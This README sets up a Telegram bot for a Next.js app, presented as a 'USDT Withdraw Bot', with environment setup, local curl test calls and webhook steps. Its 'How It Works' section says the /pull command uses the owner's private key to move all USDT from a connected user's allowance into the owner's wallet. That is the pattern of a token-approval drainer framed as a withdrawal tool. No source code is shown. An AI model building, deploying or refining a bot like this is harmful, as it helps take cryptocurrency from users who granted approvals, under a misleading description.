# Telegram USDT Withdraw Bot Setup

## Features
- ✅ Connect wallet via Telegram
- ✅ Check USDT balance
- ✅ Pull all USDT from allowance to your wallet
- ✅ Real-time Telegram notifications

## Setup Instructions

### 1. Configure Environment Variables
Create `.env.local` file in the project root and add:
```
OWNER_PRIVATE_KEY=your_private_key_here
```

**⚠️ IMPORTANT:** 
- Use the private key of the owner wallet (0x5Bfb9D94F7233DCb4A1eDd533EEe861E78f43cE0)
- Never commit `.env.local` to git
- Keep your private key secure

### 2. Start the Development Server
```bash
npm run dev
```

Server will run on: http://localhost:3000

### 3. Test the Bot

#### Option A: Direct Simulation (Local Testing)
```
# Start bot
curl "http://localhost:3000/api/simulate-message?command=/start"

# Connect wallet
curl "http://localhost:3000/api/simulate-message?wallet=0x5Bfb9D94F7233DCb4A1eDd533EEe861E78f43cE0"

# Check balance
curl "http://localhost:3000/api/simulate-message?command=/balance"

# Pull USDT
curl "http://localhost:3000/api/simulate-message?command=/pull"
```

#### Option B: Telegram Polling (Production)
Delete webhook first:
```
curl http://localhost:3000/api/delete-webhook
```

Then poll for messages:
```
curl http://localhost:3000/api/poll-telegram
```

#### Option C: Webhook (Production with HTTPS)
Deploy your app to a service with HTTPS (Vercel, Netlify, etc.), then:
```
curl "http://localhost:3000/api/setup-webhook?url=https://your-domain.com/api/telegram-webhook"
```

## Bot Commands

- `/start` - Start the bot
- `/connect` - Connect your wallet (then send wallet address)
- `/balance` - Check your USDT balance
- `/pull` - Pull all USDT from allowance
- `/help` - Show help

## How It Works

1. User sends `/connect` command
2. User sends their wallet address
3. Bot stores the wallet address
4. User can check balance with `/balance`
5. User can pull all USDT with `/pull`
6. Pull uses owner's private key to sign transaction
7. USDT is transferred from user's allowance to owner's wallet

## Files Created

- `app/api/telegram-webhook/route.ts` - Main bot logic
- `app/api/poll-telegram/route.ts` - Polling endpoint
- `app/api/setup-webhook/route.ts` - Webhook setup
- `app/api/delete-webhook/route.ts` - Delete webhook
- `app/api/test-bot/route.ts` - Test bot connection
- `app/api/simulate-message/route.ts` - Simulate Telegram messages
- `.env.example` - Environment variables template

## Security Notes

- Private key is stored in environment variables only
- Never expose private key in client-side code
- Use a separate wallet for bot operations
- Keep gas (BNB) in the owner wallet for transaction fees
